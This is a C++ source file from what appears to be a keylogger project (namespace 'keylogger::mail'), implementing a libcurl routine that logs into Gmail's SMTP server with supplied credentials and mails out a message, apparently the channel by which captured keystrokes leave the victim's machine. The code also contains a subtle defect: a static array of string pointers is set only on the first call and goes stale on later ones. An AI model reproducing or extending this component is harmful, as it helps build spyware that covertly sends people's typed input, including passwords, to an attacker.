#include "CurlMailSender.h"

#include <iostream>

#include "curl/curl.h"

namespace keylogger::mail
{
namespace
{
struct upload_status
{
    int lines_read;
};

const size_t correctFormattedMailSize = 5;
}

std::vector<std::string> CurlMailSender::currentFormattedMail = {};

bool CurlMailSender::sendMail(const Mail& mail, const Credentials& credentials)
{
    constructCurrentFormattedMail(mail);
    if (currentFormattedMail.size() != correctFormattedMailSize)
    {
        return false;
    }

    struct curl_slist* recipients = NULL;
    struct upload_status upload_ctx;

    upload_ctx.lines_read = 0;

    curl_global_init(CURL_GLOBAL_ALL);
    CURL* curl = curl_easy_init();

    if (curl)
    {
        static const char* pCACertFile = R"(C:\repos\keylogger\curl-ca-bundle.crt)";
        curl_easy_setopt(curl, CURLOPT_CAINFO, pCACertFile);

        curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587");
        curl_easy_setopt(curl, CURLOPT_USE_SSL, CURLUSESSL_ALL);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 1L);
        curl_easy_setopt(curl, CURLOPT_LOGIN_OPTIONS, "AUTH=LOGIN");
        curl_easy_setopt(curl, CURLOPT_USERNAME, credentials.login.c_str());
        curl_easy_setopt(curl, CURLOPT_PASSWORD, credentials.password.c_str());
        curl_easy_setopt(curl, CURLOPT_MAIL_FROM, mail.emailSourceAddress.c_str());

        recipients = curl_slist_append(recipients, mail.emailTargetAddress.c_str());
        curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients);

        if (mail.attachment)
        {
            std::cerr << "File attachment not supported";
//            curl_mime* mime = curl_mime_init(curl);
//            curl_mimepart* part = curl_mime_addpart(mime);
//            curl_mime_filedata(part, mail.attachment->c_str());
//            curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
        }

        curl_easy_setopt(curl, CURLOPT_READFUNCTION, readEmailPayload);
        curl_easy_setopt(curl, CURLOPT_READDATA, &upload_ctx);
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);

        CURLcode res = curl_easy_perform(curl);

        if (res != CURLE_OK)
        {
            auto error = curl_easy_strerror(res);
            std::cerr << "curl_easy_perform() failed: " << error;
        }

        curl_slist_free_all(recipients);
        curl_easy_cleanup(curl);
    }

    return true;
}

void CurlMailSender::constructCurrentFormattedMail(const Mail& mail)
{
    currentFormattedMail.clear();
    currentFormattedMail.push_back("To: " + mail.emailTargetAddress + "\r\n");
    currentFormattedMail.push_back("From: " + mail.emailSourceAddress + "\r\n");
    currentFormattedMail.push_back("Subject: " + mail.subject + "\r\n");
    currentFormattedMail.emplace_back("\r\n");
    currentFormattedMail.emplace_back(mail.body + "\r\n");
}

size_t CurlMailSender::readEmailPayload(char* ptr, size_t size, size_t nmemb, void* userp)
{
    struct upload_status* upload_ctx = (struct upload_status*)userp;
    const char* data;

    if ((size == 0) || (nmemb == 0) || ((size * nmemb) < 1))
    {
        return 0;
    }

    static const char* payload_text[] = {currentFormattedMail[0].c_str(),
                                         currentFormattedMail[1].c_str(),
                                         currentFormattedMail[2].c_str(),
                                         currentFormattedMail[3].c_str(),
                                         currentFormattedMail[4].c_str(),
                                         NULL};
    data = payload_text[upload_ctx->lines_read];

    if (data)
    {
        size_t len = strlen(data);
        memcpy(ptr, data, len);
        upload_ctx->lines_read++;

        return len;
    }

    return 0;
}

}